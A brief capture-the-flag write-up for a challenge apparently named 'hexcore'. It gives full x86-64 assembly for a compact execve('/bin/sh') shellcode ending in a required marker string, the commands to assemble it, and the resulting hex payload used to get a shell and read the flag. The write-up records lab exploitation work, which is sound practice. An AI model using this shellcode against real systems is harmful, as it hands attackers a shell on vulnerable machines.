# Writeup

Find smallest `execve("/bin/sh", NULL, NULL)` [shellcode](https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html).

Write [shellcode.s](./shellcode.s) with required string "HexCore" at the end:

```asm
.intel_syntax noprefix
.section .text
    .global _start

_start:
    xor esi, esi
    push rsi
    mov rbx, 0x68732f2f6e69622f
    push rbx
    push rsp
    pop rdi
    imul esi
    mov al, 0x3b
    syscall
    .ascii "HexCore"
```

Compile and convert shellcode to hex:

```
$ as shellcode.s
$ objcopy -O binary a.out shellcode.bin -j .text
$ xxd -ps -c 0 shellcode.bin`
31f65648bb2f62696e2f2f736853545ff7eeb03b0f05486578436f7265
```

Use shellcode as input to pwn hexcore.
Get flag using `ls` and `cat flag.txt`.
